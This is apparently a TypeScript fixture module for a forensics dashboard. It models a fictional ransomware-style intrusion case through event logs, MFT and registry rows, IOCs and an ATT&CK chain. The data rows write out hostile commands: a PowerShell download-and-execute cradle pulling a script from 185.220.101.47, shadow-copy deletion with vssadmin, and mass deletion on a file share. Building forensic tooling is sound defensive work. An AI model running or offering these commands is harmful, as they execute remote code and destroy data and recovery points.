import { PAYLOAD, RUN_KEY, SERVICE } from "./case-canon";
import type {
  Activity,
  AttackCatalog,
  CaseInfo,
  ChainStep,
  EventRow,
  Ioc,
  MftRow,
  RegistryRow,
} from "./types";

export const CASE: CaseInfo = {
  id: "MUNINN-2026-0142",
  host: "WKS-FIN-07.corp.local",
  analyst: "b.osborne",
  os: "Windows 11 Pro 23H2",
  acquired: "2026-07-11 09:14:22 UTC",
  tool: "Muninn Acquire 2.4.1 (KAPE + custody ledger)",
};

export const ATTACK: AttackCatalog = {
  T1091: "Replication Through Removable Media",
  T1059: "Command and Scripting Interpreter",
  "T1059.001": "PowerShell",
  T1027: "Obfuscated Files or Information",
  T1071: "Application Layer Protocol",
  "T1071.001": "Web Protocols",
  T1547: "Boot or Logon Autostart Execution",
  "T1547.001": "Registry Run Keys / Startup Folder",
  T1543: "Create or Modify System Process",
  "T1543.003": "Windows Service",
  T1070: "Indicator Removal",
  "T1070.001": "Clear Windows Event Logs",
  "T1070.006": "Timestomp",
  T1485: "Data Destruction",
  T1490: "Inhibit System Recovery",
  T1021: "Remote Services",
  "T1021.002": "SMB/Windows Admin Shares",
};

export const EVENTS: EventRow[] = [
  {
    t: "09:41:03",
    ts: "2026-07-11 09:41:03",
    id: 6416,
    ch: "Security",
    lvl: "warning",
    src: "Microsoft-Windows-Security-Auditing",
    pid: 4,
    user: "SYSTEM",
    msg: "New external device (USB Mass Storage) recognized by the system.",
    mitre: ["T1091"],
    detail: {
      DeviceID: "USB\\VID_0951&PID_1666\\AABBCC112233",
      Vendor: "Kingston",
      Product: "DataTraveler 3.0",
      SerialNumber: "AABBCC112233",
    },
  },
  {
    t: "09:41:47",
    ts: "2026-07-11 09:41:47",
    id: 4688,
    ch: "Security",
    lvl: "critical",
    src: "Microsoft-Windows-Security-Auditing",
    pid: 5124,
    user: "CORP\\jsmith",
    msg: "New process: powershell.exe -nop -w hidden -enc <base64 payload 4.2 KB>",
    mitre: ["T1059.001", "T1027"],
    detail: {
      ParentProcess: "explorer.exe (PID 3120)",
      CommandLine:
        "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JAB...",
      IntegrityLevel: "Medium",
      TriggeredBy: "invoice_2026.pdf.lnk (from removable drive)",
      "Hash(SHA256) powershell.exe":
        "e2b4a1c9... (Microsoft-signed benign host binary)",
    },
  },
  {
    t: "09:41:49",
    ts: "2026-07-11 09:41:49",
    id: 4104,
    ch: "PowerShell/Operational",
    lvl: "critical",
    src: "Microsoft-Windows-PowerShell",
    pid: 5124,
    user: "CORP\\jsmith",
    msg: "Script block: IEX ((New-Object Net.WebClient).DownloadString('http://185.220.101.47/stg.ps1'))",
    mitre: ["T1059.001", "T1071.001"],
    detail: {
      ScriptBlockId: "a91f-7c2d-4e88",
      Length: "8,142 bytes",
      Signed: "false",
      StagerUrl: "http://185.220.101.47/stg.ps1",
    },
  },
  {
    t: "09:41:52",
    ts: "2026-07-11 09:41:52",
    id: 3,
    ch: "Sysmon/Operational",
    lvl: "critical",
    src: "Microsoft-Windows-Sysmon",
    pid: 5124,
    user: "CORP\\jsmith",
    msg: "Network connection: powershell.exe → 185.220.101.47:443 (TLS)",
    mitre: ["T1071.001"],
    detail: {
      Protocol: "TCP/443 (TLS)",
      Remote: "185.220.101.47",
      Reputation: "Tor exit node",
      DNS: "cdn-static-eu.hopto.pro (dynamic DNS)",
    },
  },
  {
    t: "09:42:11",
    ts: "2026-07-11 09:42:11",
    id: 13,
    ch: "Sysmon/Operational",
    lvl: "warning",
    src: "Microsoft-Windows-Sysmon",
    pid: 5124,
    user: "CORP\\jsmith",
    msg: `Registry value set: ${RUN_KEY.hive}\\...\\Run\\${RUN_KEY.value} = ${RUN_KEY.command}`,
    mitre: ["T1547.001"],
    detail: {
      TargetObject: `HKU\\S-1-5-21-...\\${RUN_KEY.path}\\${RUN_KEY.value}`,
      Details: RUN_KEY.command,
    },
  },
  {
    t: "09:42:34",
    ts: "2026-07-11 09:42:34",
    id: 7045,
    ch: "System",
    lvl: "warning",
    src: "Service Control Manager",
    pid: 616,
    user: "SYSTEM",
    msg: `Service installed: ${SERVICE.name} (${SERVICE.imagePath})`,
    mitre: ["T1543.003"],
    detail: {
      ServiceName: SERVICE.name,
      ImagePath: SERVICE.imagePathWithArgs,
      StartType: "Auto",
      Account: "LocalSystem",
      ImageHash: `SHA256: ${PAYLOAD.sha256}`,
    },
  },
  {
    t: "09:44:02",
    ts: "2026-07-11 09:44:02",
    id: 4663,
    ch: "Security",
    lvl: "info",
    src: "Microsoft-Windows-Security-Auditing",
    pid: 5124,
    user: "CORP\\jsmith",
    msg: `SetFileTime called against ${SERVICE.imagePath}`,
    mitre: ["T1070.006"],
    detail: {
      Target: SERVICE.imagePath,
      Operation: "SetFileTime ($STANDARD_INFO backdated)",
      Requires: "SACL auditing enabled on target",
    },
  },
  {
    t: "10:07:18",
    ts: "2026-07-11 10:07:18",
    id: 1102,
    ch: "Security",
    lvl: "critical",
    src: "Microsoft-Windows-Eventlog",
    pid: 872,
    user: "CORP\\jsmith",
    msg: "The audit log was cleared.",
    mitre: ["T1070.001"],
    detail: {
      Channel: "Security",
      Note: "immediately precedes destructive impact",
    },
  },
  {
    t: "10:09:44",
    ts: "2026-07-11 10:09:44",
    id: 524,
    ch: "Application",
    lvl: "critical",
    src: "vssadmin",
    pid: 7420,
    user: "CORP\\jsmith",
    msg: "vssadmin.exe delete shadows /all /quiet",
    mitre: ["T1490"],
    detail: {
      CommandLine: "vssadmin delete shadows /all /quiet",
      Effect: "Volume Shadow Copies destroyed",
    },
  },
  {
    t: "10:12:07",
    ts: "2026-07-11 10:12:07",
    id: 4624,
    ch: "Security",
    lvl: "warning",
    src: "Microsoft-Windows-Security-Auditing",
    pid: 4,
    user: "CORP\\jsmith",
    msg: "Logon type 3 from WKS-FIN-07 to SRV-FILES-01 (SMB)",
    mitre: ["T1021.002"],
    detail: {
      LogonType: "3 (Network)",
      Source: "WKS-FIN-07",
      Target: "SRV-FILES-01",
      Share: "admin$ / finance$",
    },
  },
  {
    t: "10:12:41",
    ts: "2026-07-11 10:12:41",
    id: 4688,
    ch: "Security",
    lvl: "warning",
    src: "Microsoft-Windows-Security-Auditing",
    pid: 8112,
    user: "CORP\\jsmith",
    msg: "cmd.exe /c del /f /q \\\\SRV-FILES-01\\finance$\\*.*",
    mitre: ["T1485"],
    detail: {
      CommandLine: "cmd.exe /c del /f /q \\\\SRV-FILES-01\\finance$\\*.*",
      Parent: `${SERVICE.name}.exe`,
      Effect: "847 files destroyed on file share",
    },
  },
];

export const MFT: MftRow[] = [
  {
    rec: 84213,
    path: SERVICE.imagePath,
    size: "812 KB",
    si: "2021-04-08 14:22:11",
    fn: "2026-07-11 09:42:29",
    flag: true,
    note: "$SI predates $FN by 5+ years — timestomp",
    sha256: PAYLOAD.sha256,
  },
  {
    rec: 84214,
    path: "C:\\Users\\jsmith\\AppData\\Roaming\\Microsoft\\wsc.ps1",
    size: "4.2 KB",
    si: "2026-07-11 09:42:03",
    fn: "2026-07-11 09:42:03",
    flag: false,
    note: "Persistence loader (launched by Run key WinSecCheck)",
  },
  {
    rec: 84771,
    path: "C:\\Users\\jsmith\\Downloads\\invoice_2026.pdf.lnk",
    size: "1.1 KB",
    si: "2026-07-11 09:41:45",
    fn: "2026-07-11 09:41:45",
    flag: false,
    note: "Malicious .lnk copied from removable drive — execution trigger",
  },
  {
    rec: 91002,
    path: "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
    size: "20 MB",
    si: "2026-07-11 10:07:18",
    fn: "2019-03-19 10:32:17",
    flag: true,
    note: "$FN older than $SI — log wiped and recreated",
  },
  {
    rec: 91120,
    path: "\\\\SRV-FILES-01\\finance$\\Q2_projections.xlsx",
    size: "0 KB",
    si: "2026-07-11 10:12:44",
    fn: "2024-02-11 08:03:52",
    flag: false,
    note: "Truncated to 0 bytes during mass delete",
  },
];

export const REGISTRY: RegistryRow[] = [
  {
    hive: "NTUSER.DAT",
    key: `${RUN_KEY.hive}\\${RUN_KEY.path}`,
    value: RUN_KEY.value,
    data: RUN_KEY.command,
    t: "2026-07-11 09:42:11",
    mitre: ["T1547.001"],
  },
  {
    hive: "SYSTEM",
    key: `HKLM\\${SERVICE.registryKey}`,
    value: "ImagePath",
    data: SERVICE.imagePath,
    t: "2026-07-11 09:42:34",
    mitre: ["T1543.003"],
  },
  {
    hive: "SYSTEM",
    key: "HKLM\\SYSTEM\\...\\USBSTOR\\Disk&Ven_Kingston",
    value: "FriendlyName",
    data: "Kingston DataTraveler 3.0",
    t: "2026-07-11 09:41:03",
    mitre: ["T1091"],
  },
];

export const IOCS: Ioc[] = [
  {
    type: "ipv4",
    val: "185.220.101.47",
    conf: "high",
    ctx: "Tor exit node — C2 / stager (TCP 443 TLS, TCP 80 stager)",
    mitre: ["T1071.001"],
  },
  {
    type: "domain",
    val: "cdn-static-eu.hopto.pro",
    conf: "medium",
    ctx: "Dynamic DNS resolving to the C2 IP",
    mitre: ["T1071.001"],
  },
  {
    type: "sha256",
    val: PAYLOAD.sha256,
    conf: "high",
    ctx: `${SERVICE.name}.exe — dropped payload / service binary`,
    mitre: ["T1543.003", "T1070.006"],
  },
  {
    type: "path",
    val: SERVICE.imagePath,
    conf: "high",
    ctx: "Persistence service binary (masqueraded Edge updater)",
    mitre: ["T1543.003"],
  },
  {
    type: "usb-serial",
    val: "AABBCC112233",
    conf: "medium",
    ctx: "Kingston DataTraveler — initial access",
    mitre: ["T1091"],
  },
  {
    type: "regkey",
    val: `${RUN_KEY.hive}\\...\\Run\\${RUN_KEY.value}`,
    conf: "high",
    ctx: `User-scope persistence → ${RUN_KEY.loaderScript}`,
    mitre: ["T1547.001"],
  },
];


export const CHAIN: ChainStep[] = [
  {
    phase: "Initial Access",
    color: "red",
    ic: "usb",
    title: "Malicious USB inserted",
    meta: "Kingston DataTraveler · SN AABBCC112233",
    mitre: ["T1091"],
    src: ["Security 6416", "Registry (USBSTOR)"],
    t: "09:41:03",
  },
  {
    phase: "Execution",
    color: "orange",
    ic: "terminal",
    title: "Obfuscated PowerShell via .lnk",
    meta: "powershell.exe -nop -w hidden -enc … (parent explorer.exe)",
    mitre: ["T1059.001", "T1027"],
    src: ["Security 4688", "PS 4104"],
    t: "09:41:47",
  },
  {
    phase: "C2",
    color: "orange",
    ic: "network",
    title: "Beacon to 185.220.101.47:443",
    meta: "TLS to Tor exit node · stager pulled from /stg.ps1",
    mitre: ["T1071.001"],
    src: ["Sysmon 3", "PS 4104"],
    t: "09:41:52",
  },
  {
    phase: "Persistence",
    color: "purple",
    ic: "key",
    title: "Run key + service installed",
    meta: `Run: ${RUN_KEY.value} (wsc.ps1) · Svc: ${SERVICE.name} (${SERVICE.name}.exe)`,
    mitre: ["T1547.001", "T1543.003"],
    src: ["Sysmon 13", "System 7045"],
    t: "09:42:34",
  },
  {
    phase: "Defense Evasion",
    color: "blue",
    ic: "clock",
    title: "Timestomp + event log wipe",
    meta: `${SERVICE.name}.exe $SI backdated · Security.evtx cleared`,
    mitre: ["T1070.006", "T1070.001"],
    src: [
      "Security 4663",
      "Security 1102",
      "MFT #84213",
      "MFT #91002",
    ],
    t: "10:07:18",
  },
  {
    phase: "Impact",
    color: "red",
    ic: "trash",
    title: "Shadow copies deleted, 847 files destroyed",
    meta: "vssadmin delete shadows · del /f /q on finance$ share",
    mitre: ["T1490", "T1485"],
    src: ["App 524", "Security 4688"],
    t: "10:09:44",
  },
  {
    phase: "Lateral Movement",
    color: "green",
    ic: "chain",
    title: "SMB pivot to SRV-FILES-01",
    meta: "NTLM logon type 3 · admin share write",
    mitre: ["T1021.002"],
    src: ["Security 4624", "Security 4688"],
    t: "10:12:07",
  },
];

export const ACTIVITY: Activity[] = [
  { t: "09:14:22", kind: "info", msg: "Case MUNINN-2026-0142 acquired via KAPE" },
  { t: "09:16:03", kind: "success", msg: "Custody ledger sealed (hash-chained)" },
  { t: "09:41:47", kind: "critical", msg: "Suspicious PowerShell execution detected" },
  { t: "09:42:34", kind: "warning", msg: "Persistence service registered" },
  { t: "10:07:18", kind: "critical", msg: "Security event log cleared" },
  { t: "10:09:44", kind: "critical", msg: "Shadow copies destroyed" },
  { t: "10:14:00", kind: "info", msg: "YARA scan complete — 3 rules matched" },
];

// ---------------------------------------------------------------------------
// KPIs & severity — canonical numbers surfaced on the dashboard. Computed at
// module load from the arrays above (single source of truth) plus the fixed
// case-workload numbers from the CONTEXT / case.json spec.
// ---------------------------------------------------------------------------

const _techniques = new Set(EVENTS.flatMap((e) => e.mitre));
const _sev = EVENTS.reduce(
  (acc, e) => {
    acc[e.lvl] += 1;
    return acc;
  },
  { critical: 0, warning: 0, info: 0, success: 0 } as Record<
    "critical" | "warning" | "info" | "success",
    number
  >,
);

export const SEVERITY = {
  ..._sev,
  dominant: (Object.entries(_sev).sort(
    (a, b) => b[1] - a[1],
  )[0]?.[0] ?? "info") as "critical" | "warning" | "info" | "success",
};

export const KPIS = {
  events: EVENTS.length,
  critical: _sev.critical,
  techniques: _techniques.size,
  iocs: IOCS.length,
  caseLoadPct: 62,
  activeCases: 4,
  totalCases: 6,
  evidenceUsedGB: 12.4,
  evidenceTotalGB: 20,
};
